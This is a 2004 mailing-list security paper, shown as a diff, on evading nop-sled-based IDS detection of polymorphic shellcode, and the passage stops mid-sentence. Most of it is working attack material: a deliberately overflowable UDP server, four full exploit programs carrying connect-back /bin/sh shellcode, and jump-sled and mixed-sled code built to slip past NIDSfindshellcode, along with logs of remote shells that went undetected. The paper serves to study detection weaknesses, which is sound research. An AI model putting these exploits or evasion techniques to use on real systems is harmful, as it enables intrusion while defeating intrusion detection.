@@ -1,0 +1,1502 @@
+
+Date: Fri,  1 Oct 2004 17:28:01 -0700
+From: "Phantasmal Phantasmagoria" <phantasmal@...h.ai>
+To: full-disclosure@...ts.netsys.com, bugtraq@...urityfocus.com,
+   focus-ids@...urityfocus.com
+Subject: On Polymorphic Evasion
+
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+- ------------------------------------
+
+On Polymorphic Evasion
+by Phantasmal Phantasmagoria
+phantasmal@...h.ai
+
+- ---- Table of Contents -------------
+
+        1 - Prologue
+        2 - Introduction
+        3 - Detection
+        4 - Testing
+        5 - Evasion
+        6 - Future
+        7 - Thoughts
+        8 - Appendix
+        9 - Reference
+
+- ------------------------------------
+- ---- Prologue ----------------------
+
+The decision made to write and publish the following paper came after
+a lengthy internal debate as to whether the detection of polymorphic
+shellcode was indeed an appropriate component of an IDS, and therefore
+whether the evasion of an IDS performing polymorphic detection was an
+area of interest. This was compounded by the fact that the CLET team
+had previously published research [1] closely related to the subject
+matter of the paper in question.
+
+The conclusion was made that exploit payload detection was important
+in IDS, if only as a backup to the protocol anomaly or signature detection
+that form the core of the system. The reasoning in this lies in the possibility
+that a new and unknown attack would fail to be detected by the existing
+ruleset. In this situation the detection of an exploit payload could
+well be the only indication of an intrusion.
+
+The importance of polymorphic shellcode detection has been determined,
+ but we still need to examine the reasoning behind the publication of
+an evasion technique which would only seem to specifically benefit an
+attacker. At this stage we approach the debate over disclosure, where
+inevitably personal interest and opinion override any sense of technical
+merit. For that reason I have put the discussion covering the disclosure
+of this paper after the technical presentation, where the reader may
+suitably choose to ignore it.
+
+Finally, yes, I am aware of the CLET team's recursive nop sleds. The
+techniques developed below started as something quite different, then
+became quite related without my knowing it. If nothing else, a working
+implementation has been presented.
+
+- ------------------------------------
+- ---- Introduction ------------------
+
+The concept of polymorphic code historically originated in the virus
+writing scene. Polymorphism as a technique, changing the outward appearance
+of a piece of machine code while retaining the same functionality, gained
+popularity in the early 90's, sending the AV industry scrambling to find
+ways to detect the stream of newly released self-morphing viruses. From
+this scramble the first anti-virus heurstics were developed.
+
+Recently, the usage of polymorphic shellcode in exploit payloads has
+gained populatiry. This is due in part to the wide spread deployment
+of signature based intusion detection systems. Just as AV struggled to
+cope with the new breed of polymorphic attacks, IDS too has been faced
+with the task of developing new detection methods.
+
+- ------------------------------------
+- ---- Detection ---------------------
+
+At the start of 2002, Next Generation Security researcher Fermin J. Serna
+proposed a technique [2] for the detection of polymorphic shellcodes
+in an Application or Network IDS. A traditional polymorphic payload has
+the following format:
+
+[ POLYMORPHIC NOP SLED ] [ DECRYPTION ENGINE ] [ CIPHERED SHELLCODE ]
+
+Each of these three sections of the payload are individually generated
+to contain differing opcodes between attacks while still retaining the
+functionality of the original shellcode. While a traditional NOP sled
+contains only the nop (0x90) operator, a polymorphic sled contains any
+number of single byte junk opcodes. This renders the traditional pattern
+matching of the 0x90 nop sled redundant. Serna's proposed detection technique
+targets the polymorphic nop sled, comparing the sled against a list of
+possible junk opcodes, marking the payload as "shellcode" if a configured
+amount of contiguous junk operations occur. This paper is an attempt
+to develop a counter-technique to the polymorphic nop sled detection
+proposed by Serna. For an analysis of the Snort preprocessor "Fnord"
+[3] and the "Prelude Hybrid IDS" [4] which implement this detection method
+see the Appendix. The numerous other aspects of modern IDS that help
+identify an attack, such as protocol anomaly and exception based techniques
+are beyond the scope of this discussion.
+
+- ------------------------------------
+- ---- Testing -----------------------
+
+At the same time as releasing the paper describing the technique above,
+ Next Generation Security released a proof of concept tool, "NIDSfindshellcode".
+To develop a counter-technique we first need to test the reliability
+of this tool. To do this an example UDP server containg a vulnerability
+was developed and attacked in view of NIDSfindshellcode. Firstly, we
+will set up the vulnerable program "philosophy" on the host that will
+be attacked, "halo":
+
+/* START philosophy.c */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <string.h>
+
+void philosophize(char *idea) {
+        char brain[1024];
+        strcpy(brain, idea);
+
+        printf("received message ... \n");
+
+        return;
+}
+
+int main(void) {
+        char buf[2048], *p;
+        int s, rs, clen, x;
+        struct sockaddr_in saddr, caddr;
+
+        if ((s = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
+                perror("socket");
+                exit(1);
+        }
+
+        saddr.sin_family = AF_INET;
+        saddr.sin_port = htons(1986);
+        saddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+        if ((rs = bind(s, (struct sockaddr *) &saddr, sizeof(saddr)))
+
+                        == -1) {
+                perror("bind");
+                exit(1);
+        }
+
+        printf("the philosopher is listening on port 1986\n");
+
+        memset(buf, 0, 2048);
+
+        if (recvfrom(s, buf, 2048, 0, (struct sockaddr *) &caddr,
+                        &clen) == -1) {
+                perror("recvfrom");
+                exit(1);
+        }
+
+        p = buf;
+
+        philosophize(p);
+}
+/* END philosophy.c */
+
+- --------
+halo$ uname -mnrs
+NetBSD halo 1.6.2_STABLE i386
+halo$ gcc -o philosophy philosophy.c
+halo$ ./philosophy
+the philosopher is listening on port 1986
+
+halo# ./nidsfindshellcode -d bce0
+nidsfindshellcode 0.2 by Ferm�n J. Serna <fjserna@...ec.com>
+Next Generation Security Technologies
+http://www.ngsec.com
+- --------
+
+We are now ready to carry out the first test from the attacker's host,
+ "satyr". We will use the following exploit, which does not yet contain
+any polymorphism:
+
+/* START dragon.c */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/select.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <string.h>
+
+#define PAYLOAD_LENGTH  1024 + 8
+#define BASE_RET        0xbfbfd1f0
+
+char shellcode[] =
+ "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
+ "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
+ "\x61\xcd\x80\x31\xd2\x52\x52\xba"
+ "\x41\x41\x41\x41\x83\xf2\xff\x52"
+ "\x31\xd2\x66\x68\x8b\xa4\xb7\x02"
+ "\x66\x53\x89\xe1\xb2\x10\x52\x51"
+ "\x50\x52\x89\xc1\x31\xc0\xb0\x62"
+ "\xcd\x80\x89\xca\x31\xdb\x39\xc3"
+ "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+ "\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
+ "\x80\x31\xc0\x31\xdb\x43\x53\x52"
+ "\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
+ "\x53\x52\x50\xb0\x5a\xcd\x80\x31"
+ "\xc0\x50\x68\x2f\x2f\x73\x68\x68"
+ "\x2f\x62\x69\x6e\x89\xe3\x50\x54"
+ "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
+ "\xb0\x01\xcd\x80";
+
+struct sockaddr_in get_localaddr(struct sockaddr_in saddr) {
+        int sockr, len, on = 1;
+        struct sockaddr_in dest;
+        struct sockaddr_in iface;
+
+        memset(&iface, 0, sizeof(iface));
+        memcpy(&dest, &saddr, sizeof(struct sockaddr_in));
+
+        dest.sin_port = htons(11111);
+
+        sockr = socket(AF_INET, SOCK_DGRAM, 0);
+
+        if(setsockopt(sockr, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))
+                        == -1) {
+                printf("getsockopt error\n");
+                exit(1);
+        }
+
+        if(connect(sockr, (struct sockaddr *)&dest,
+                        sizeof(struct sockaddr_in)) == -1) {
+                printf("connect error\n");
+                exit(1);
+        }
+
+        len = sizeof(iface);
+
+        if (getsockname(sockr, (struct sockaddr *)&iface, &len) == -1)
+{
+                printf("getsockname error\n");
+                exit(1);
+        }
+
+        close(sockr);
+
+        return iface;
+}
+
+int main(int argc, char *argv[]) {
+        int s, ret_adj, nops, x;
+        struct sockaddr_in saddr, caddr;
+        char payload[PAYLOAD_LENGTH+1];
+        long ret_addr;
+
+        if (argc < 2) {
+                printf("./dragon <target ip> [ret adjustment]\n");
+                exit(1);
+        }
+
+        if (strstr(argv[1], "255") != NULL) {
+                printf("invalid ip address\n");
+                exit(1);
+        }
+
+        if (argc > 2)
+                ret_adj = atoi(argv[2]);
+        else
+                ret_adj = 0;
+
+        saddr.sin_family = PF_INET;
+        saddr.sin_port = htons(1986);
+        inet_aton(argv[1], &saddr.sin_addr);
+
+        caddr = get_localaddr(saddr);
+
+        nops = 1024 - sizeof(shellcode);
+        memcpy(shellcode+24, &caddr.sin_addr, 4);
+
+        shellcode[24] ^= 255;
+        shellcode[25] ^= 255;
+        shellcode[26] ^= 255;
+        shellcode[27] ^= 255;
+
+        ret_addr = BASE_RET + ret_adj;
+
+        printf("using ret addr: %p\n", ret_addr);
+
+        memset(payload, 0x90, PAYLOAD_LENGTH);
+        memcpy(payload+nops, shellcode, sizeof(shellcode) - 1);
+
+        for (x = 0; x < (PAYLOAD_LENGTH-1024); x += 4)
+                *((long *) &payload[1024 + x]) = ret_addr;
+
+        payload[PAYLOAD_LENGTH] = '\0';
+
+        if ((s = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
+                perror("socket");
+                exit(1);
+        }
+
+        if (sendto(s, payload, PAYLOAD_LENGTH, 0, (struct sockaddr *)
+                        &saddr, sizeof(saddr)) == -1) {
+                perror("sendto");
+                close(s);
+                exit(1);
+        }
+
+        close(s);
+}
+/* END dragon.c */
+
+- --------
+satyr$ cat /etc/hosts | grep halo
+192.168.0.5     halo            halo
+satyr$ gcc -o dragon dragon.c
+satyr$ ./dragon 192.168.0.5
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+uptime
+ 1:25AM  up  3:05, 1 user, load averages: 2.19, 2.13, 2.09
+exit
+satyr$
+
+halo# ./nidsfindshellcode -d bce0
+nidsfindshellcode 0.2 by Ferm�n J. Serna <fjserna@...ec.com>
+Next Generation Security Technologies
+http://www.ngsec.com
+
+IA32 shellcode found: Protocol UDP satyr:2048 -> halo:1986
+- --------
+
+As seen above, the exploit was executed successfully and NIDSfindshellcode
+accurately detected our plain 0x90 nop sled. Lets now see how it handles
+a polymorphic payload by using a version of our exploit modified to use
+the ADMmutate engine [5]. Assume that after each attack the system is
+reset as follows:
+
+- --------
+halo$ ./philosophy
+the philosopher is listening on port 1986
+received message ...
+halo$ ./philosophy
+the philosopher is listening on port 1986
+
+halo# ./nidsfindshellcode -d bce0
+nidsfindshellcode 0.2 by Ferm�n J. Serna <fjserna@...ec.com>
+Next Generation Security Technologies
+http://www.ngsec.com
+- --------
+
+The following exploit is modified to use the ADMmutate engine:
+
+/* START dragon_polymorph.c */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/select.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <string.h>
+#include "ADMmutapi.h"
+
+#define PAYLOAD_LENGTH  1024 + 8
+#define BASE_RET        0xbfbfd1f0
+
+char shellcode[] =
+ "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
+ "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
+ "\x61\xcd\x80\x31\xd2\x52\x52\xba"
+ "\x41\x41\x41\x41\x83\xf2\xff\x52"
+ "\x31\xd2\x66\x68\x8b\xa4\xb7\x02"
+ "\x66\x53\x89\xe1\xb2\x10\x52\x51"
+ "\x50\x52\x89\xc1\x31\xc0\xb0\x62"
+ "\xcd\x80\x89\xca\x31\xdb\x39\xc3"
+ "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+ "\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
+ "\x80\x31\xc0\x31\xdb\x43\x53\x52"
+ "\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
+ "\x53\x52\x50\xb0\x5a\xcd\x80\x31"
+ "\xc0\x50\x68\x2f\x2f\x73\x68\x68"
+ "\x2f\x62\x69\x6e\x89\xe3\x50\x54"
+ "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
+ "\xb0\x01\xcd\x80";
+
+struct sockaddr_in get_localaddr(struct sockaddr_in saddr) {
+        int sockr, len, on = 1;
+        struct sockaddr_in dest;
+        struct sockaddr_in iface;
+
+        memset(&iface, 0, sizeof(iface));
+        memcpy(&dest, &saddr, sizeof(struct sockaddr_in));
+
+        dest.sin_port = htons(11111);
+
+        sockr = socket(AF_INET, SOCK_DGRAM, 0);
+
+        if(setsockopt(sockr, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))
+                        == -1) {
+                printf("getsockopt error\n");
+                exit(1);
+        }
+
+        if(connect(sockr, (struct sockaddr *)&dest,
+                        sizeof(struct sockaddr_in)) == -1) {
+                printf("connect error\n");
+                exit(1);
+        }
+
+        len = sizeof(iface);
+
+        if(getsockname(sockr, (struct sockaddr *)&iface, &len) == -1)
+{
+                printf("getsockname error\n");
+                exit(1);
+        }
+
+        close(sockr);
+
+        return iface;
+}
+
+int main(int argc, char *argv[]) {
+        struct morphctl *mctlp;
+        struct morphctl mut;
+        int s, ret_adj, nops, x;
+        struct sockaddr_in saddr, caddr;
+        char payload[PAYLOAD_LENGTH+1];
+        long ret_addr;
+
+        if (argc < 2) {
+                printf( "./dragon_polymorph "
+                        "<target ip> [ret adjustment]\n");
+                exit(1);
+        }
+
+        if (strstr(argv[1], "255") != NULL) {
+                printf("invalid ip address\n");
+                exit(1);
+        }
+
+        if (argc > 2)
+                ret_adj = atoi(argv[2]);
+        else
+                ret_adj = 0;
+
+        mut.upper = mut.lower = 0;
+        mut.banned = NULL;
+        mctlp = &mut;
+        mut.arch = IA32_SLIDE;
+
+        saddr.sin_family = PF_INET;
+        saddr.sin_port = htons(1986);
+        inet_aton(argv[1], &saddr.sin_addr);
+
+        caddr = get_localaddr(saddr);
+
+        nops = 1024 - sizeof(shellcode);
+        memcpy(shellcode+24, &caddr.sin_addr, 4);
+
+        shellcode[24] ^= 255;
+        shellcode[25] ^= 255;
+        shellcode[26] ^= 255;
+        shellcode[27] ^= 255;
+
+        ret_addr = BASE_RET + ret_adj;
+
+        printf("using ret addr: %p\n", ret_addr);
+
+        memset(payload, 0x90, PAYLOAD_LENGTH);
+        memcpy(payload+nops, shellcode, sizeof(shellcode) - 1);
+
+        for (x = 0; x < (PAYLOAD_LENGTH-1024); x += 4)
+                *((long *) &payload[1024 + x]) = ret_addr;
+
+        payload[PAYLOAD_LENGTH] = '\0';
+
+        init_mutate(mctlp);
+        apply_key(payload, strlen(shellcode), nops-1, mctlp);
+        apply_jnops(payload, nops-1, mut);
+        apply_engine(payload, strlen(shellcode), nops-1, mut);
+
+        if ((s = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
+                perror("socket");
+                exit(1);
+        }
+
+        if (sendto(s, payload, PAYLOAD_LENGTH, 0, (struct sockaddr *)
+
+                        &saddr, sizeof(saddr)) == -1) {
+                perror("sendto");
+                close(s);
+                exit(1);
+        }
+
+        close(s);
+}
+/* END dragon_polymorph.c */
+
+- --------
+satyr$ gcc -o dragon_polymorph dragon_polymorph.c ADMmuteng.o
+satyr$ ./dragon_polymorph 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+halo# ./nidsfindshellcode -d bce0
+nidsfindshellcode 0.2 by Ferm�n J. Serna <fjserna@...ec.com>
+Next Generation Security Technologies
+http://www.ngsec.com
+
+IA32 shellcode found: Protocol UDP satyr:2048 -> halo:1986
+- --------
+
+The exploit is still working well and NIDSfindshellcode still managed
+to detect our attack, despite our attempts at polymorphism. From this
+we can conclude that the technique Serna put forward does indeed work
+with the existing polymorphic shellcode technology. From this point on
+I will provide some of the possible counter-techniques available in order
+to evade a system that uses Serna's nop count detection method, such
+as NIDSfindshellcode.
+
+- ------------------------------------
+- ---- Evasion -----------------------
+
+Serna's technique is essentially advanced pattern-matching. This means
+that to avoid detection we simply need to break the pattern in some way,
+ while of course, still retaining the nop sled functionality. The simplest
+way to do this is to introduce opcodes to the sled that do not match
+the technique's definition of "junk opcodes". The first of these techniques
+is simply to change the nop sled into a "jump sled".
+
+The jump operation is not treated as a junk opcode, but a combination
+of jumps can act as a sled by which we can reach the decryption engine
+of the payload:
+
+Ordinary nop sled:
+NOP -> NOP -> NOP ... NOP -> NOP -> DE -> SC
+
+Jump sled:
+  _______________ _______________ __________
+ |               |               |          |
+JMP JMP JMP ... JMP JMP JMP ... JMP JMP JMP DE SC
+     |   |_______|   |   |_______|   |   |__|
+     |___________|   |___________|   |______|
+
+In this diagram every single JMP call eventually ends at DE, the decryption
+engine. It would of course be a much simpler picture if all JMP's could
+go directly to the DE, but in terms of an exploit payload sled this is
+not sensible. The JMP operation is at least 2 bytes - one for the JMP
+opcode and one for the argument. The JMP argument can be up to 4 bytes
+long, more than long enough for all of the JMP's to go directly to the
+DE, but we have to remember that the exploit could return anywhere in
+the sled. If we were to return on a JMP argument our exploit would have
+a high likelihood of failure - we would be landing on an invalid instruction.
+Due to this chance we choose to use the smallest JMP argument available,
+ but as a result, we can jump at most 127 bytes forward. That is why
+the intermediary JMP's are required.
+
+Let's see how this technique is handled by NIDSfindshellcode by using
+a modified version of the exploits we used in testing above:
+
+/* START dragon_jumpslide.c */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/select.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <string.h>
+#include "ADMmutapi.h"
+
+#define PAYLOAD_LENGTH  1024 + 8
+#define BASE_RET        0xbfbfd1f0
+
+char shellcode[] =
+ "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
+ "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
+ "\x61\xcd\x80\x31\xd2\x52\x52\xba"
+ "\x41\x41\x41\x41\x83\xf2\xff\x52"
+ "\x31\xd2\x66\x68\x8b\xa4\xb7\x02"
+ "\x66\x53\x89\xe1\xb2\x10\x52\x51"
+ "\x50\x52\x89\xc1\x31\xc0\xb0\x62"
+ "\xcd\x80\x89\xca\x31\xdb\x39\xc3"
+ "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+ "\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
+ "\x80\x31\xc0\x31\xdb\x43\x53\x52"
+ "\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
+ "\x53\x52\x50\xb0\x5a\xcd\x80\x31"
+ "\xc0\x50\x68\x2f\x2f\x73\x68\x68"
+ "\x2f\x62\x69\x6e\x89\xe3\x50\x54"
+ "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
+ "\xb0\x01\xcd\x80";
+
+void jump_slide(char *payload, int nop_size) {
+        int top, leap;
+
+        top = nop_size - 3;
+        leap = 1;
+
+        while (top > 0) {
+
+                while(leap < 128 && top > 0) {
+                        *(payload+top) = 0xeb;
+                        *(payload+top+1) = leap;
+                        top -= 2;
+                        leap += 2;
+                }
+
+                top -= 1;
+                leap = 1;
+        }
+}
+
+struct sockaddr_in get_localaddr(struct sockaddr_in saddr) {
+        int sockr, len, on = 1;
+        struct sockaddr_in dest;
+        struct sockaddr_in iface;
+
+        memset(&iface, 0, sizeof(iface));
+        memcpy(&dest, &saddr, sizeof(struct sockaddr_in));
+
+        dest.sin_port = htons(11111);
+
+        sockr = socket(AF_INET, SOCK_DGRAM, 0);
+
+        if (setsockopt(sockr, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))
+                        == -1) {
+                printf("getsockopt error\n");
+                exit(1);
+        }
+
+        if (connect(sockr, (struct sockaddr *)&dest,
+                        sizeof(struct sockaddr_in)) == -1) {
+                printf("connect error\n");
+                exit(1);
+        }
+
+        len = sizeof(iface);
+
+        if (getsockname(sockr, (struct sockaddr *)&iface, &len) == -1)
+{
+                printf("getsockname error\n");
+                exit(1);
+        }
+
+        close(sockr);
+
+        return iface;
+}
+
+int main(int argc, char *argv[]) {
+        struct morphctl *mctlp;
+        struct morphctl mut;
+        int s, ret_adj, nops, x;
+        struct sockaddr_in saddr, caddr;
+        char payload[PAYLOAD_LENGTH+1];
+        long ret_addr;
+
+        if (argc < 2) {
+                printf( "./dragon_jumpslide "
+                        "<target ip> [ret adjustment]\n");
+                exit(1);
+        }
+
+        if (strstr(argv[1], "255") != NULL) {
+                printf("invalid ip address\n");
+                exit(1);
+        }
+
+        if (argc > 2)
+                ret_adj = atoi(argv[2]);
+        else
+                ret_adj = 0;
+
+        mut.upper = mut.lower = 0;
+        mut.banned = NULL;
+        mctlp = &mut;
+        mut.arch = IA32_SLIDE;
+
+        saddr.sin_family = PF_INET;
+        saddr.sin_port = htons(1986);
+        inet_aton(argv[1], &saddr.sin_addr);
+
+        caddr = get_localaddr(saddr);
+
+        nops = 1024 - sizeof(shellcode);
+        memcpy(shellcode+24, &caddr.sin_addr, 4);
+
+        shellcode[24] ^= 255;
+        shellcode[25] ^= 255;
+        shellcode[26] ^= 255;
+        shellcode[27] ^= 255;
+
+        ret_addr = BASE_RET + ret_adj;
+
+        printf("using ret addr: %p\n", ret_addr);
+
+        memset(payload, 0x90, PAYLOAD_LENGTH);
+        memcpy(payload+nops, shellcode, sizeof(shellcode) - 1);
+
+        for (x = 0; x < (PAYLOAD_LENGTH-1024); x += 4)
+                *((long *) &payload[1024 + x]) = ret_addr;
+
+        payload[PAYLOAD_LENGTH] = '\0';
+
+        init_mutate(mctlp);
+        apply_key(payload, strlen(shellcode), nops-1, mctlp);
+        apply_engine(payload, strlen(shellcode), nops-1, mut);
+
+        for (x = 0; (unsigned char) payload[x] == 0x90; x++);
+
+        jump_slide(payload, x-1);
+
+        if ((s = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
+                perror("socket");
+                exit(1);
+        }
+
+        if (sendto(s, payload, PAYLOAD_LENGTH, 0, (struct sockaddr *)
+
+                        &saddr, sizeof(saddr)) == -1) {
+                perror("sendto");
+                close(s);
+                exit(1);
+        }
+
+        close(s);
+}
+/* END dragon_jumpslide.c */
+
+- --------
+satyr$ gcc -o dragon_jumpslide dragon_jumpslide.c ADMmuteng.o
+satyr$ ./dragon_jumpslide 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+- --------
+
+It appears the exploit has failed. Lets try again, this time adjusting
+the return address.
+
+- --------
+satyr$ ./dragon_jumpslide 192.168.0.5 1 2> /dev/null
+using ret addr: 0xbfbfd1f1
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+- --------
+
+Excellent, that did the trick. Before we discuss the first failure and
+move on to an improved technique, lets check NIDSfindshellcode.
+
+- --------
+halo# ./nidsfindshellcode -d bce0
+nidsfindshellcode 0.2 by Ferm�n J. Serna <fjserna@...ec.com>
+Next Generation Security Technologies
+http://www.ngsec.com
+
+- --------
+
+Indeed, not a trace of being detected. We have successfully evaded Serna's
+nop-slide-count technique, but there is still much to improve on. As
+you may have noticed, our jumpslide method is essentially flawed. We
+say it is flawed in the sense that there is a 50% chance (or near enough)
+that the exploit will fail. This chance is for the reason discussed above,
+ the possibility that we will return on one of our JMP arguments resulting
+in an illegal instruction (or an illegal reference to memory). We can
+see an example of this when our first exploitation attempt failed, only
+to succeed after adjusting the return address by 1. So then, is the jump
+slide technique entirely useless? No, but it does need a modification.
+In fact, in order to reduce the margin for failure we need to combine
+the jump slide with our original polymorphic nop sled:
+
+NOP -> JMP -> NOP -> NOP -> NOP -> JMP -> NOP -> NOP -> DE -> SC
+        |                           |______|______|
+        |__________________________________|
+
+The general idea of this technique is to stop the IDS from recognizing
+a nop sled by breaking the chain of "junk operators" with JMP calls.
+This greatly reduces the chance that we will land on a JMP argument,
+while still providing a perfectly valid sled to the decryption engine.
+Lets try it out:
+
+/* START dragon_nopjump.c */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/select.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <time.h>
+#include "ADMmutapi.h"
+
+#define PAYLOAD_LENGTH  1024 + 8
+#define BASE_RET        0xbfbfd1f0
+
+char shellcode[] =
+ "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
+ "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
+ "\x61\xcd\x80\x31\xd2\x52\x52\xba"
+ "\x41\x41\x41\x41\x83\xf2\xff\x52"
+ "\x31\xd2\x66\x68\x8b\xa4\xb7\x02"
+ "\x66\x53\x89\xe1\xb2\x10\x52\x51"
+ "\x50\x52\x89\xc1\x31\xc0\xb0\x62"
+ "\xcd\x80\x89\xca\x31\xdb\x39\xc3"
+ "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+ "\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
+ "\x80\x31\xc0\x31\xdb\x43\x53\x52"
+ "\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
+ "\x53\x52\x50\xb0\x5a\xcd\x80\x31"
+ "\xc0\x50\x68\x2f\x2f\x73\x68\x68"
+ "\x2f\x62\x69\x6e\x89\xe3\x50\x54"
+ "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
+ "\xb0\x01\xcd\x80";
+
+void jump_slide(unsigned char *payload, int nop_size) {
+        int top, leap, noplen, x, y;
+        extern struct junks intel_njunk[];
+        top = nop_size - 3;
+        leap = 1;
+
+        srand(time(NULL));
+
+        while (top > 0) {
+
+                while(leap < 128 && top > 0) {
+                        noplen = rand()%20;
+                        leap += noplen;
+                        top -= noplen;
+
+                        *(payload+top) = 0xeb;
+                        *(payload+top+1) = leap;
+                }
+
+                top -= 1;
+                leap = 1;
+        }
+
+        srand(time(NULL)*getpid());
+
+        for (x = 0; x < nop_size; x++) {
+                if (*(payload+x) == 0x90) {
+                        y = rand()%45;
+
+                        if (!intel_njunk[y].noppad) {
+                                x--;
+                                continue;
+                        }
+
+                        *(payload+x) = *(intel_njunk[y].code);
+                }
+        }
+}
+
+struct sockaddr_in get_localaddr(struct sockaddr_in saddr) {
+        int sockr, len, on = 1;
+        struct sockaddr_in dest;
+        struct sockaddr_in iface;
+
+        memset(&iface, 0, sizeof(iface));
+        memcpy(&dest, &saddr, sizeof(struct sockaddr_in));
+
+        dest.sin_port = htons(11111);
+
+        sockr = socket(AF_INET, SOCK_DGRAM, 0);
+
+        if (setsockopt(sockr, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))
+                        == -1) {
+                printf("getsockopt error\n");
+                exit(1);
+        }
+
+        if (connect(sockr, (struct sockaddr *)&dest,
+                        sizeof(struct sockaddr_in)) == -1) {
+                printf("connect error\n");
+                exit(1);
+        }
+
+        len = sizeof(iface);
+
+        if (getsockname(sockr, (struct sockaddr *)&iface, &len) == -1)
+{
+                printf("getsockname error\n");
+                exit(1);
+        }
+
+        close(sockr);
+
+        return iface;
+}
+
+int main(int argc, char *argv[]) {
+        struct morphctl *mctlp;
+        struct morphctl mut;
+        int s, ret_adj, nops, x;
+        struct sockaddr_in saddr, caddr;
+        char payload[PAYLOAD_LENGTH+1];
+        long ret_addr;
+
+        if (argc < 2) {
+                printf("./dragon_nopjump <target ip> [ret adjustment]\n");
+                exit(1);
+        }
+
+        if (strstr(argv[1], "255") != NULL) {
+                printf("invalid ip address\n");
+                exit(1);
+        }
+
+        if (argc > 2)
+                ret_adj = atoi(argv[2]);
+        else
+                ret_adj = 0;
+
+        mut.upper = mut.lower = 0;
+        mut.banned = NULL;
+        mctlp = &mut;
+        mut.arch = IA32_SLIDE;
+
+        saddr.sin_family = PF_INET;
+        saddr.sin_port = htons(1986);
+        inet_aton(argv[1], &saddr.sin_addr);
+
+        caddr = get_localaddr(saddr);
+
+        nops = 1024 - sizeof(shellcode);
+        memcpy(shellcode+24, &caddr.sin_addr, 4);
+
+        shellcode[24] ^= 255;
+        shellcode[25] ^= 255;
+        shellcode[26] ^= 255;
+        shellcode[27] ^= 255;
+
+        ret_addr = BASE_RET + ret_adj;
+
+        printf("using ret addr: %p\n", ret_addr);
+
+        memset(payload, 0x90, PAYLOAD_LENGTH);
+        memcpy(payload+nops, shellcode, sizeof(shellcode) - 1);
+
+        for (x = 0; x < (PAYLOAD_LENGTH-1024); x += 4)
+                *((long *) &payload[1024 + x]) = ret_addr;
+
+        payload[PAYLOAD_LENGTH] = '\0';
+
+        init_mutate(mctlp);
+        apply_key(payload, strlen(shellcode), nops-1, mctlp);
+        apply_engine(payload, strlen(shellcode), nops-1, mut);
+
+        for (x = 0; (unsigned char) payload[x] == 0x90; x++);
+
+        jump_slide(payload, x-1);
+
+        if ((s = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
+                perror("socket");
+                exit(1);
+        }
+
+        if (sendto(s, payload, PAYLOAD_LENGTH, 0, (struct sockaddr *)
+
+                        &saddr, sizeof(saddr)) == -1) {
+                perror("sendto");
+                close(s);
+                exit(1);
+        }
+
+        close(s);
+}
+/* END dragon_nopjump.c */
+
+- --------
+satyr$ gcc -o dragon_nopjump dragon_nopjump.c ADMmuteng.o
+satyr$ ./dragon_nopjump 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satry$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+halo# ./nidsfindshellcode -d bce0
+nidsfindshellcode 0.2 by Ferm�n J. Serna <fjserna@...ec.com>
+Next Generation Security Technologies
+http://www.ngsec.com
+
+- --------
+
+Our exploit using a combination of the jump sled and traditional polymorphic
+nop sled was successful on the first attempt and still managed to avoid
+detection by Serna's technique. The chance of the exploit failing due
